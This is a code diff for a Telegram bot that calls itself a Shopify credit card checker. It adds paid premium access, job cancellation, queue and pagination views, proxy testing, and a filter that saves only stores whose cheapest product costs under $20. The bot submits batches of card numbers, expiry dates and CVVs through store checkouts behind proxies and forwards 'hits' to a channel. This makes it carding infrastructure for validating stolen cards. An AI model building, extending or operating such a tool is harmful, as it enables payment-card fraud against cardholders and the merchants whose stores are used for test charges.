@@ -5,6 +5,7 @@ import re
 import random
 import argparse
 from urllib.parse import urlparse
+import html
 from pyrogram import Client, filters, types
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from pyrogram.enums import ParseMode
@@ -39,6 +40,9 @@ HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
 MAX_SITES_PER_USER = 500
 MAX_GLOBAL_SITES = 500
 WORKER_COUNT = 15
+MAX_SITE_PRICE_USD = 20.0
+LIST_PAGE_SIZE = 20
+QUEUE_PAGE_SIZE = 5
 
 # Logging setup
 logging.basicConfig(
@@ -68,6 +72,9 @@ active_tasks = {}  # task_id -> task info
 task_stats = {}    # message_id -> task stats
 task_messages = {} # message_id -> message object
 task_users = {}    # message_id -> user_id
+task_types = {}    # message_id -> task type (mchk/chksite)
+cancelled_mchk_tasks = set()  # progress message IDs cancelled by user
+user_active_mchk_tasks = defaultdict(set)  # user_id -> set(progress message IDs)
 
 # Global queues
 TASK_QUEUE = asyncio.Queue()
@@ -216,6 +223,36 @@ def parse_proxy(proxy_str):
         return f"http://{user}:{password}@{ip}:{port}"
     else:
         return None
+
+def parse_price_value(value, default=None):
+    """Parse numeric price values safely."""
+    try:
+        if value is None:
+            return default
+        return float(str(value).replace(',', '').strip())
+    except (ValueError, TypeError):
+        return default
+
+def is_price_under_limit(product_info, limit=MAX_SITE_PRICE_USD):
+    """Return True when product_info price is strictly below the configured limit."""
+    if not isinstance(product_info, dict):
+        return False
+    price = parse_price_value(product_info.get('price'), default=None)
+    if price is None:
+        return False
+    return price < float(limit)
+
+def build_pagination_row(prefix, user_id, page, total_pages):
+    """Build a standard < > pagination row."""
+    if total_pages <= 1:
+        return None
+    buttons = []
+    if page > 0:
+        buttons.append(InlineKeyboardButton("<", callback_data=f"{prefix}:{user_id}:{page-1}"))
+    buttons.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="ignore"))
+    if page < total_pages - 1:
+        buttons.append(InlineKeyboardButton(">", callback_data=f"{prefix}:{user_id}:{page+1}"))
+    return buttons
 
 def is_captcha_required(response_text):
     if not response_text:
@@ -487,8 +524,6 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
             # Get variant_id from site
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple) and info[0] is False:
-                # Remove dead site from user's sites
-                await remove_dead_site(user_id, site_url)
                 return False, "SITE_DEAD", gateway, total_price, currency, receipt_id, order_url
             variant_id = info['variant_id']
 
@@ -544,7 +579,6 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                         sst = extract_between(text, '"sessionToken":"', '"')
                 
                 if 'login' in checkout_url.lower():
-                    await remove_dead_site(user_id, site_url)
                     return False, "LOGIN_REQUIRED", gateway, total_price, currency, receipt_id, order_url
 
                 queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
@@ -1211,16 +1245,20 @@ async def update_task_progress(message_id, stats, start_time=None):
         user = await users_col.find_one({'user_id': user_id}) if user_id else None
         user_name = user.get('first_name', 'User') if user else 'User'
         
+        task_type = task_types.get(message_id, "unknown")
+        status_label = "CANCELLED" if stats.get('cancelled') else "RUNNING"
+
         # Create progress text
         progress_text = f"""TASK
 USER: {user_name}
 START TIME: {start_time.strftime('%H:%M:%S')}
 ELAPSED: {elapsed_str}
+STATUS: {status_label}
 
 CREATED BY @still_alivenow"""
 
         # Create buttons
-        keyboard = InlineKeyboardMarkup([
+        keyboard_rows = [
             [
                 InlineKeyboardButton(f"TOTAL {stats.get('total', 0)}", callback_data="ignore"),
                 InlineKeyboardButton(f"CHECKED {stats.get('checked', 0)}", callback_data="ignore")
@@ -1233,7 +1271,14 @@ CREATED BY @still_alivenow"""
                 InlineKeyboardButton(f"OTP {stats.get('otp', 0)}", callback_data="ignore"),
                 InlineKeyboardButton(f"FAILED {stats.get('failed', 0)}", callback_data="ignore")
             ]
-        ])
+        ]
+
+        if task_type == 'mchk' and user_id and not stats.get('cancelled'):
+            keyboard_rows.append([
+                InlineKeyboardButton("🛑 Cancel", callback_data=f"mcancel:{user_id}:{message_id}")
+            ])
+
+        keyboard = InlineKeyboardMarkup(keyboard_rows)
         
         try:
             await message.edit_text(
@@ -1266,6 +1311,11 @@ async def task_worker(worker_id):
             message = task['message']
             task_type = task['type']
             task_id = task.get('task_id')
+            progress_msg_id = task.get('progress_msg_id')
+
+            if task_type == 'mchk' and progress_msg_id in cancelled_mchk_tasks:
+                TASK_QUEUE.task_done()
+                continue
             
             # Process the card
             start_time = time.time()
@@ -1296,7 +1346,8 @@ async def task_worker(worker_id):
                 'process_time': process_time,
                 'message': message,
                 'task_type': task_type,
-                'task_id': task_id
+                'task_id': task_id,
+                'progress_msg_id': progress_msg_id
             }
             
             # Put result in queue
@@ -1333,6 +1384,11 @@ async def result_handler():
             original_message = result.get('message')
             task_type = result.get('task_type', 'single')
             task_id = result.get('task_id')
+            progress_msg_id = result.get('progress_msg_id')
+
+            if task_type == 'mchk' and progress_msg_id in cancelled_mchk_tasks:
+                RESULT_QUEUE.task_done()
+                continue
             
             # Get user's first name from database
             user = await users_col.find_one({'user_id': user_id})
@@ -1443,7 +1499,9 @@ by @still_alivenow"""
             if task_type in ['mchk', 'chksite'] and original_message:
                 try:
                     # Initialize stats for this progress message
-                    msg_id = original_message.id if hasattr(original_message, 'id') else str(original_message)
+                    msg_id = progress_msg_id if progress_msg_id is not None else (
+                        original_message.id if hasattr(original_message, 'id') else str(original_message)
+                    )
                     
                     if msg_id not in task_stats:
                         task_stats[msg_id] = {
@@ -1474,6 +1532,10 @@ by @still_alivenow"""
                     
                     # Clean up if task is complete
                     if task_stats[msg_id]['checked'] >= task_stats[msg_id]['total']:
+                        if task_type == 'mchk':
+                            user_active_mchk_tasks[user_id].discard(msg_id)
+                            if user_id in user_active_mchk_tasks and not user_active_mchk_tasks[user_id]:
+                                user_active_mchk_tasks.pop(user_id, None)
                         # Keep stats for a while then clean up
                         asyncio.create_task(cleanup_task_data(msg_id, delay=300))
                             
@@ -1489,15 +1551,115 @@ by @still_alivenow"""
 async def cleanup_task_data(msg_id, delay=300):
     """Clean up task data after delay"""
     await asyncio.sleep(delay)
+    user_id = task_users.get(msg_id)
+    task_type = task_types.get(msg_id)
     task_stats.pop(msg_id, None)
     task_messages.pop(msg_id, None)
     task_users.pop(msg_id, None)
+    task_types.pop(msg_id, None)
+    cancelled_mchk_tasks.discard(msg_id)
+    if task_type == 'mchk' and user_id is not None:
+        user_active_mchk_tasks[user_id].discard(msg_id)
+        if user_id in user_active_mchk_tasks and not user_active_mchk_tasks[user_id]:
+            user_active_mchk_tasks.pop(user_id, None)
 
 # Callback query handler
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
     """Handle callback queries from inline buttons"""
-    await callback_query.answer()  # Just acknowledge the callback
+    data = callback_query.data or ""
+    user_id = callback_query.from_user.id
+
+    try:
+        if data == "ignore":
+            await callback_query.answer()
+            return
+
+        if data.startswith("ppg:"):
+            _, owner_id, page = data.split(":")
+            owner_id = int(owner_id)
+            page = int(page)
+            if user_id != owner_id:
+                await callback_query.answer("This page is not for you.", show_alert=True)
+                return
+            text, keyboard = await build_proxy_page(owner_id, page)
+            await callback_query.message.edit_text(
+                text,
+                reply_markup=keyboard,
+                disable_web_page_preview=True
+            )
+            await callback_query.answer()
+            return
+
+        if data.startswith("spg:"):
+            _, owner_id, page = data.split(":")
+            owner_id = int(owner_id)
+            page = int(page)
+            if user_id != owner_id:
+                await callback_query.answer("This page is not for you.", show_alert=True)
+                return
+            text, keyboard = await build_sites_page(owner_id, page)
+            await callback_query.message.edit_text(
+                text,
+                reply_markup=keyboard,
+                disable_web_page_preview=True
+            )
+            await callback_query.answer()
+            return
+
+        if data.startswith("qpg:"):
+            _, owner_id, page = data.split(":")
+            owner_id = int(owner_id)
+            page = int(page)
+            if user_id != owner_id:
+                await callback_query.answer("This queue page is not for you.", show_alert=True)
+                return
+            text, keyboard = await build_queue_page(owner_id, page)
+            await callback_query.message.edit_text(
+                text,
+                reply_markup=keyboard,
+                parse_mode=ParseMode.HTML,
+                disable_web_page_preview=True
+            )
+            await callback_query.answer()
+            return
+
+        if data.startswith("mcancel:"):
+            _, owner_id, msg_id = data.split(":")
+            owner_id = int(owner_id)
+            msg_id = int(msg_id)
+            if user_id != owner_id:
+                await callback_query.answer("You can only cancel your own task.", show_alert=True)
+                return
+
+            stats = task_stats.get(msg_id)
+            if not stats:
+                await callback_query.answer("Task not found or already finished.", show_alert=True)
+                return
+
+            if stats.get('cancelled'):
+                await callback_query.answer("Task already cancelled.")
+                return
+
+            stats['cancelled'] = True
+            stats['total'] = int(stats.get('checked', 0))
+            cancelled_mchk_tasks.add(msg_id)
+            user_active_mchk_tasks[user_id].discard(msg_id)
+            if user_id in user_active_mchk_tasks and not user_active_mchk_tasks[user_id]:
+                user_active_mchk_tasks.pop(user_id, None)
+
+            await update_task_progress(msg_id, stats)
+            asyncio.create_task(cleanup_task_data(msg_id, delay=300))
+            await callback_query.answer("✅ Current /mchk task cancelled.")
+            return
+
+        await callback_query.answer()
+    except Exception as e:
+        logger.error(f"Callback handler error: {e}")
+        try:
+            await callback_query.answer("Action failed, please try again.", show_alert=True)
+        except Exception:
+            pass
 
 # Database functions
 async def init_db():
@@ -1505,6 +1667,8 @@ async def init_db():
     try:
         # Users collection indexes
         await users_col.create_index('user_id', unique=True)
+        await users_col.create_index('premium_expires_at')
+        await users_col.create_index('premium_lifetime')
         
         # Proxies collection indexes
         await proxies_col.create_index([('user_id', 1), ('proxy', 1)], unique=True)
@@ -1666,12 +1830,320 @@ async def get_user_stats(user_id):
         'sites_count': sites_count
     }
 
+def is_admin(user_id):
+    return user_id in ADMINS
+
+async def is_user_authorized(user_id):
+    """Admins are always authorized; others need active premium."""
+    if is_admin(user_id):
+        return True, "admin"
+    user_doc = await users_col.find_one(
+        {'user_id': user_id},
+        {'premium_lifetime': 1, 'premium_expires_at': 1}
+    )
+    if not user_doc:
+        return False, None
+    if user_doc.get('premium_lifetime'):
+        return True, "lifetime"
+    expires_at = user_doc.get('premium_expires_at')
+    if expires_at and expires_at > datetime.utcnow():
+        return True, expires_at
+    return False, expires_at
+
+async def require_authorized_user(message):
+    """Guard command usage for premium/admin users only."""
+    user = message.from_user
+    allowed, _ = await is_user_authorized(user.id)
+    if allowed:
+        return True
+    await message.reply_text(
+        "❌ You are not authorized to use this bot.\n"
+        "Contact an admin for premium access.",
+        disable_web_page_preview=True
+    )
+    return False
+
+async def set_user_premium(target_user_id, days):
+    now = datetime.utcnow()
+    update_doc = {
+        'premium_updated_at': now
+    }
+    if days == 0:
+        update_doc['premium_lifetime'] = True
+        update_doc['premium_expires_at'] = None
+    else:
+        update_doc['premium_lifetime'] = False
+        update_doc['premium_expires_at'] = now + timedelta(days=days)
+
+    await users_col.update_one(
+        {'user_id': target_user_id},
+        {
+            '$set': update_doc,
+            '$setOnInsert': {
+                'user_id': target_user_id,
+                'first_name': str(target_user_id),
+                'joined_at': now,
+                'total_checks': 0
+            }
+        },
+        upsert=True
+    )
+    return update_doc.get('premium_expires_at')
+
+async def remove_user_premium(target_user_id):
+    result = await users_col.update_one(
+        {'user_id': target_user_id},
+        {
+            '$set': {
+                'premium_lifetime': False,
+                'premium_expires_at': None,
+                'premium_updated_at': datetime.utcnow()
+            }
+        }
+    )
+    return result.matched_count > 0
+
+async def get_active_premium_users():
+    now = datetime.utcnow()
+    cursor = users_col.find(
+        {
+            '$or': [
+                {'premium_lifetime': True},
+                {'premium_expires_at': {'$gt': now}}
+            ]
+        },
+        {'user_id': 1, 'first_name': 1, 'username': 1, 'premium_lifetime': 1, 'premium_expires_at': 1}
+    ).sort('user_id', 1)
+    return await cursor.to_list(length=None)
+
+async def is_proxy_working(proxy_str):
+    """Validate proxy connectivity before saving."""
+    proxy = parse_proxy(proxy_str)
+    if not proxy:
+        return False, "Invalid format"
+    connector = aiohttp.TCPConnector(ssl=False)
+    timeout = aiohttp.ClientTimeout(total=8)
+    try:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get("https://httpbin.org/ip", proxy=proxy) as resp:
+                if resp.status == 200:
+                    return True, "OK"
+                return False, f"HTTP {resp.status}"
+    except Exception as e:
+        return False, str(e)
+
+async def build_proxy_page(user_id, page):
+    proxies = await get_user_proxies(user_id)
+    if not proxies:
+        return "❌ You have no saved proxies", None
+
+    total_pages = (len(proxies) + LIST_PAGE_SIZE - 1) // LIST_PAGE_SIZE
+    page = max(0, min(page, total_pages - 1))
+    start = page * LIST_PAGE_SIZE
+    end = start + LIST_PAGE_SIZE
+    chunk = proxies[start:end]
+
+    proxy_text = (
+        f"📋 Your Proxies ({len(proxies)} total)\n"
+        f"Page {page + 1}/{total_pages}\n\n"
+    )
+    for i, proxy in enumerate(chunk, start + 1):
+        proxy_text += f"{i}. {proxy}\n"
+
+    nav_row = build_pagination_row("ppg", user_id, page, total_pages)
+    keyboard = InlineKeyboardMarkup([nav_row]) if nav_row else None
+    return proxy_text, keyboard
+
+async def build_sites_page(user_id, page):
+    user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
+    sites_list = user_sites_doc.get('sites', []) if user_sites_doc else []
+
+    if not sites_list:
+        return "❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", None
+
+    total_pages = (len(sites_list) + LIST_PAGE_SIZE - 1) // LIST_PAGE_SIZE
+    page = max(0, min(page, total_pages - 1))
+    start = page * LIST_PAGE_SIZE
+    end = start + LIST_PAGE_SIZE
+    chunk = sites_list[start:end]
+
+    total_price = 0.0
+    price_count = 0
+    for site_entry in sites_list:
+        if isinstance(site_entry, dict):
+            parsed = parse_price_value(site_entry.get('price'), default=None)
+            if parsed is not None:
+                total_price += parsed
+                price_count += 1
+
+    avg_price = (total_price / price_count) if price_count else None
+
+    sites_text = (
+        f"📋 Your Working Sites ({len(sites_list)} total)\n"
+        f"Page {page + 1}/{total_pages}\n\n"
+    )
+    for i, site_entry in enumerate(chunk, start + 1):
+        if isinstance(site_entry, dict):
+            site_url = site_entry.get('url', 'Unknown')
+            price = site_entry.get('price', 'N/A')
+            sites_text += f"{i}. {site_url} - ${price}\n"
+        else:
+            sites_text += f"{i}. {site_entry}\n"
+
+    sites_text += "\n📊 Statistics:\n"
+    sites_text += f"Total Sites: {len(sites_list)}\n"
+    if avg_price is not None:
+        sites_text += f"Avg Price: ${avg_price:.2f}\n"
+    sites_text += "\nTo remove sites use /rmvsite"
+
+    nav_row = build_pagination_row("spg", user_id, page, total_pages)
+    keyboard = InlineKeyboardMarkup([nav_row]) if nav_row else None
+    return sites_text, keyboard
+
+def format_queue_user_block(queue_entry):
+    profile_name = html.escape(queue_entry['name'])
+    profile_link = f"<a href='tg://user?id={queue_entry['user_id']}'>{profile_name}</a>"
+    return (
+        f"{profile_link}\n"
+        f"Tasktype: {queue_entry['task_type']}\n"
+        f"Total: {queue_entry['total']}     Checked: {queue_entry['checked']}\n"
+        f"HIT: {queue_entry['hit']}\n"
+        f"Live: {queue_entry['live']}     Dead: {queue_entry['dead']}\n"
+    )
+
+async def build_queue_page(requesting_user_id, page):
+    active_msg_ids = []
+    for msg_id, stats in task_stats.items():
+        total = int(stats.get('total', 0))
+        checked = int(stats.get('checked', 0))
+        if total > checked and not stats.get('cancelled'):
+            active_msg_ids.append(msg_id)
+
+    aggregates = {}
+    for msg_id in active_msg_ids:
+        uid = task_users.get(msg_id)
+        stats = task_stats.get(msg_id, {})
+        if not uid or not stats:
+            continue
+        if uid not in aggregates:
+            aggregates[uid] = {
+                'user_id': uid,
+                'total': 0,
+                'checked': 0,
+                'hit': 0,
+                'live': 0,
+                'dead': 0,
+                'types': set()
+            }
+        aggregates[uid]['total'] += int(stats.get('total', 0))
+        aggregates[uid]['checked'] += int(stats.get('checked', 0))
+        aggregates[uid]['hit'] += int(stats.get('hit', 0))
+        aggregates[uid]['live'] += int(stats.get('live', 0))
+        aggregates[uid]['dead'] += int(stats.get('failed', 0))
+        aggregates[uid]['types'].add(task_types.get(msg_id, 'mchk'))
+
+    user_docs = {}
+    if aggregates:
+        cursor = users_col.find(
+            {'user_id': {'$in': list(aggregates.keys())}},
+            {'user_id': 1, 'first_name': 1}
+        )
+        docs = await cursor.to_list(length=None)
+        user_docs = {doc['user_id']: doc for doc in docs}
+
+    global_queue = []
+    for uid, data in aggregates.items():
+        raw_types = data.pop('types')
+        if raw_types == {'mchk'}:
+            task_type = "Multi(.txt)"
+        elif raw_types == {'chksite'}:
+            task_type = "CheckSite"
+        else:
+            task_type = "Mixed"
+        user_name = user_docs.get(uid, {}).get('first_name') or str(uid)
+        data['name'] = user_name
+        data['task_type'] = task_type
+        global_queue.append(data)
+
+    global_queue.sort(key=lambda x: (x['total'] - x['checked']), reverse=True)
+
+    your_queue = next((entry for entry in global_queue if entry['user_id'] == requesting_user_id), None)
+
+    total_pages = max(1, (len(global_queue) + QUEUE_PAGE_SIZE - 1) // QUEUE_PAGE_SIZE)
+    page = max(0, min(page, total_pages - 1))
+    start = page * QUEUE_PAGE_SIZE
+    end = start + QUEUE_PAGE_SIZE
+    global_page_chunk = global_queue[start:end]
+
+    lines = ["<b>Your Queue</b>"]
+    if your_queue:
+        lines.append(format_queue_user_block(your_queue))
+    else:
+        lines.append("No active tasks.\n")
+
+    lines.append("<b>Global Queue</b>")
+    if global_page_chunk:
+        for entry in global_page_chunk:
+            lines.append(format_queue_user_block(entry))
+    else:
+        lines.append("No active tasks in queue.\n")
+
+    lines.append(f"Page {page + 1}/{total_pages}")
+    queue_text = "\n".join(lines)
+
+    nav_row = build_pagination_row("qpg", requesting_user_id, page, total_pages)
+    keyboard = InlineKeyboardMarkup([nav_row]) if nav_row else None
+    return queue_text, keyboard
+
+async def cancel_user_mchk_tasks(user_id):
+    """Cancel all currently running/pending mchk jobs for a user."""
+    active_msg_ids = list(user_active_mchk_tasks.get(user_id, set()))
+    cancelled_count = 0
+
+    for msg_id in active_msg_ids:
+        stats = task_stats.get(msg_id)
+        if not stats:
+            user_active_mchk_tasks[user_id].discard(msg_id)
+            continue
+
+        total = int(stats.get('total', 0))
+        checked = int(stats.get('checked', 0))
+        if checked >= total:
+            user_active_mchk_tasks[user_id].discard(msg_id)
+            continue
+
+        stats['cancelled'] = True
+        stats['total'] = checked
+        cancelled_mchk_tasks.add(msg_id)
+        user_active_mchk_tasks[user_id].discard(msg_id)
+        cancelled_count += 1
+
+        try:
+            await update_task_progress(msg_id, stats)
+        except Exception:
+            pass
+        asyncio.create_task(cleanup_task_data(msg_id, delay=300))
+
+    if user_id in user_active_mchk_tasks and not user_active_mchk_tasks[user_id]:
+        user_active_mchk_tasks.pop(user_id, None)
+
+    return cancelled_count
+
 # Bot commands
 @app.on_message(filters.command('start'))
 async def start_command(client, message):
     """Start command handler"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+
+    allowed, _ = await is_user_authorized(user.id)
+    if not allowed:
+        await message.reply_text(
+            "❌ You are not authorized to use this bot.\n"
+            "Ask admin to grant access using /addpremium <tgid> <days> (0 for lifetime).",
+            disable_web_page_preview=True
+        )
+        return
     
     welcome_text = f"""👋 Welcome {user.first_name}!
 
@@ -1682,12 +2154,13 @@ I'm a Shopify Credit Card Checker Bot. Here are my commands:
 
 🔹 <b>Mass Check</b>
 /mchk - Send up to 15 cards (one per line) or reply to a .txt file (only hits/live cards sent)
+/cancelmchk - Stop your current /mchk queue
 
 🔹 <b>Site Checker</b>
-/chksite - Test sites and get working ones (reply to .txt file with sites)
+/chksite - Test sites (only sites with cheapest product under ${MAX_SITE_PRICE_USD:.0f} are saved)
 
 🔹 <b>Proxy Management</b>
-/addproxy - Add proxies (one per line) or reply to .txt
+/addproxy - Add proxies (one per line) or reply to .txt (proxy is tested first)
 /delproxy - Delete all your proxies
 /showproxy - Show your saved proxies
 
@@ -1698,13 +2171,17 @@ I'm a Shopify Credit Card Checker Bot. Here are my commands:
 
 🔹 <b>Info</b>
 /stats - Show your statistics
+/queue - Show your queue + global queue
 
 <b>Admin Only Commands:</b>
-/loadsite - Add global sites (max {MAX_GLOBAL_SITES})
+/addpremium &lt;tgid&gt; &lt;days&gt; (0 = lifetime)
+/delpremium &lt;tgid&gt;
+/showpremium
+/loadsite - Add global sites (only cheapest product under ${MAX_SITE_PRICE_USD:.0f}, max {MAX_GLOBAL_SITES})
 /delsite - Delete global sites
 
-Bot automatically selects random sites from your working sites or global sites.
-Dead sites are automatically removed."""
+Bot selects random sites from your working sites or global sites.
+Site deletion is manual via /rmvsite or /delsite."""
 
     await message.reply_text(welcome_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
@@ -1713,6 +2190,8 @@ async def chk_command(client, message):
     """Single card check command"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Check if command has arguments or is reply
     if len(message.command) > 1:
@@ -1770,6 +2249,8 @@ async def mchk_command(client, message):
     """Mass card check command (up to 15 cards)"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Get cards from command or reply
     cards = []
@@ -1834,15 +2315,15 @@ CREATED BY @still_alivenow"""
     keyboard = InlineKeyboardMarkup([
         [
             InlineKeyboardButton(f"TOTAL {len(valid_cards)}", callback_data="ignore"),
-            InlineKeyboardButton(f"CHECKED 0", callback_data="ignore")
+            InlineKeyboardButton("CHECKED 0", callback_data="ignore")
         ],
         [
-            InlineKeyboardButton(f"HIT 0", callback_data="ignore"),
-            InlineKeyboardButton(f"LIVE 0", callback_data="ignore")
+            InlineKeyboardButton("HIT 0", callback_data="ignore"),
+            InlineKeyboardButton("LIVE 0", callback_data="ignore")
         ],
         [
-            InlineKeyboardButton(f"OTP 0", callback_data="ignore"),
-            InlineKeyboardButton(f"FAILED 0", callback_data="ignore")
+            InlineKeyboardButton("OTP 0", callback_data="ignore"),
+            InlineKeyboardButton("FAILED 0", callback_data="ignore")
         ]
     ])
     
@@ -1862,10 +2343,16 @@ CREATED BY @still_alivenow"""
         'live': 0,
         'otp': 0,
         'failed': 0,
-        'start_time': datetime.now()
+        'start_time': datetime.now(),
+        'cancelled': False
     }
     task_messages[msg_id] = processing_msg
     task_users[msg_id] = user.id
+    task_types[msg_id] = 'mchk'
+    user_active_mchk_tasks[user.id].add(msg_id)
+
+    # Refresh keyboard with working cancel callback data
+    await update_task_progress(msg_id, task_stats[msg_id])
     
     # Add cards to queue
     for i, (card_str, cc_parts) in enumerate(valid_cards):
@@ -1880,16 +2367,55 @@ CREATED BY @still_alivenow"""
             'proxy': proxy,
             'message': processing_msg,
             'type': 'mchk',
-            'task_id': task_id
+            'task_id': task_id,
+            'progress_msg_id': msg_id
         })
         
         await increment_user_checks(user.id)
+
+@app.on_message(filters.command(['cancelmchk', 'mstop']) & filters.private)
+async def cancelmchk_command(client, message):
+    """Stop current /mchk tasks for the user."""
+    user = message.from_user
+    await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
+
+    cancelled = await cancel_user_mchk_tasks(user.id)
+    if cancelled > 0:
+        await message.reply_text(
+            f"✅ Cancelled {cancelled} active /mchk task(s).",
+            disable_web_page_preview=True
+        )
+    else:
+        await message.reply_text(
+            "ℹ️ No active /mchk task found.",
+            disable_web_page_preview=True
+        )
+
+@app.on_message(filters.command('queue') & filters.private)
+async def queue_command(client, message):
+    """Show your queue and global queue."""
+    user = message.from_user
+    await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
+
+    queue_text, keyboard = await build_queue_page(user.id, 0)
+    await message.reply_text(
+        queue_text,
+        reply_markup=keyboard,
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
+    )
 
 @app.on_message(filters.command('chksite') & filters.private)
 async def chksite_command(client, message):
     """Test sites and find working ones"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Get sites from command or reply
     sites = []
@@ -1961,14 +2487,18 @@ CREATED BY @still_alivenow"""
         'live': 0,
         'otp': 0,
         'failed': 0,
-        'start_time': datetime.now()
+        'start_time': datetime.now(),
+        'cancelled': False
     }
     task_messages[msg_id] = processing_msg
     task_users[msg_id] = user.id
+    task_types[msg_id] = 'chksite'
     
     # Test sites
     working_sites = []
     dead_sites = []
+    saved_sites = []
+    skipped_price_sites = []
     
     for i, site in enumerate(sites):
         # Update progress
@@ -1976,8 +2506,11 @@ CREATED BY @still_alivenow"""
         
         if is_working:
             working_sites.append((site, product_info))
-            # Save working site
-            await save_working_site(user.id, site, product_info)
+            if is_price_under_limit(product_info):
+                _, save_msg = await save_working_site(user.id, site, product_info)
+                saved_sites.append((site, save_msg))
+            else:
+                skipped_price_sites.append((site, product_info))
             hit_status = "hit"
         else:
             dead_sites.append((site, message_text))
@@ -1996,11 +2529,19 @@ CREATED BY @still_alivenow"""
     # Create result file
     result_file = f"site_test_{user.id}.txt"
     async with aiofiles.open(result_file, 'w') as f:
-        await f.write("=== WORKING SITES ===\n\n")
+        await f.write("=== WORKING SITES (HITS) ===\n\n")
         for site, info in working_sites:
             await f.write(f"{site}\n")
             await f.write(f"  Price: ${info['price']}\n")
             await f.write(f"  Product: {info['link']}\n\n")
+
+        await f.write(f"\n=== SAVED TO USER LIST (< ${MAX_SITE_PRICE_USD:.0f}) ===\n\n")
+        for site, _ in saved_sites:
+            await f.write(f"{site}\n")
+
+        await f.write(f"\n=== WORKING BUT NOT SAVED (>= ${MAX_SITE_PRICE_USD:.0f}) ===\n\n")
+        for site, info in skipped_price_sites:
+            await f.write(f"{site} - ${info.get('price', 'N/A')}\n")
         
         await f.write("\n=== DEAD SITES ===\n\n")
         for site, error in dead_sites:
@@ -2011,9 +2552,12 @@ CREATED BY @still_alivenow"""
 
 📊 Results:
 🟢 Working: {len(working_sites)}
+✅ Saved (< ${MAX_SITE_PRICE_USD:.0f}): {len(saved_sites)}
+⚠️ Not saved (>= ${MAX_SITE_PRICE_USD:.0f}): {len(skipped_price_sites)}
 🔴 Dead: {len(dead_sites)}
 
-Working sites have been added to your list.
+Working sites count as HIT.
+Only sites under ${MAX_SITE_PRICE_USD:.0f} were added to your list.
 Check /showsites to see them."""
     
     await message.reply_document(
@@ -2031,6 +2575,8 @@ async def addproxy_command(client, message):
     """Add proxy command"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Get proxies from command or reply
     proxies = []
@@ -2058,23 +2604,44 @@ async def addproxy_command(client, message):
     # Add proxies
     added = 0
     failed = 0
+    invalid = 0
+    issues = []
     for proxy in proxies:
+        if not parse_proxy(proxy):
+            invalid += 1
+            failed += 1
+            issues.append(f"{proxy} -> invalid format")
+            continue
+
+        is_working, reason = await is_proxy_working(proxy)
+        if not is_working:
+            failed += 1
+            issues.append(f"{proxy} -> {reason}")
+            continue
+
         if await add_user_proxy(user.id, proxy):
             added += 1
         else:
             failed += 1
+            issues.append(f"{proxy} -> database error")
     
-    await message.reply_text(
+    response = (
         f"✅ Proxies added!\n"
         f"📊 Added: {added}\n"
-        f"❌ Failed: {failed}",
-        disable_web_page_preview=True
+        f"❌ Failed: {failed}\n"
+        f"⚠️ Invalid Format: {invalid}"
     )
+    if issues:
+        response += "\n\nFirst issues:\n" + "\n".join(issues[:5])
+
+    await message.reply_text(response, disable_web_page_preview=True)
 
 @app.on_message(filters.command('delproxy') & filters.private)
 async def delproxy_command(client, message):
     """Delete proxy command"""
     user = message.from_user
+    if not await require_authorized_user(message):
+        return
     
     if len(message.command) > 1:
         # Delete specific proxy
@@ -2094,33 +2661,19 @@ async def delproxy_command(client, message):
 async def showproxy_command(client, message):
     """Show user's proxies"""
     user = message.from_user
-    
-    proxies = await get_user_proxies(user.id)
-    
-    if not proxies:
-        await message.reply_text("❌ You have no saved proxies", disable_web_page_preview=True)
+    if not await require_authorized_user(message):
         return
-    
-    # Create proxy list text
-    proxy_text = "📋 Your Proxies:\n\n"
-    for i, proxy in enumerate(proxies, 1):
-        proxy_text += f"{i}. {proxy}\n"
-    
-    # Send as file if too long
-    if len(proxy_text) > 4000:
-        file_path = f"proxies_{user.id}.txt"
-        async with aiofiles.open(file_path, 'w') as f:
-            await f.write('\n'.join(proxies))
-        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})", disable_web_page_preview=True)
-        os.remove(file_path)
-    else:
-        await message.reply_text(proxy_text, disable_web_page_preview=True)
+
+    proxy_text, keyboard = await build_proxy_page(user.id, 0)
+    await message.reply_text(proxy_text, reply_markup=keyboard, disable_web_page_preview=True)
 
 @app.on_message(filters.command('addsite') & filters.private)
 async def addsite_command(client, message):
     """Check site and get cheapest product"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Get site from command
     if len(message.command) > 1:
@@ -2172,67 +2725,19 @@ async def addsite_command(client, message):
 async def showsites_command(client, message):
     """Show all your working sites"""
     user = message.from_user
-    
-    # Get user's sites
-    user_sites_doc = await user_sites_col.find_one({'user_id': user.id})
-    
-    if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
-        await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
+    if not await require_authorized_user(message):
         return
-    
-    sites_list = user_sites_doc['sites']
-    
-    # Create a formatted list of sites
-    sites_text = "📋 Your Working Sites:\n\n"
-    total_price = 0
-    price_count = 0
-    
-    for i, site_entry in enumerate(sites_list, 1):
-        if isinstance(site_entry, dict):
-            site_url = site_entry.get('url', 'Unknown')
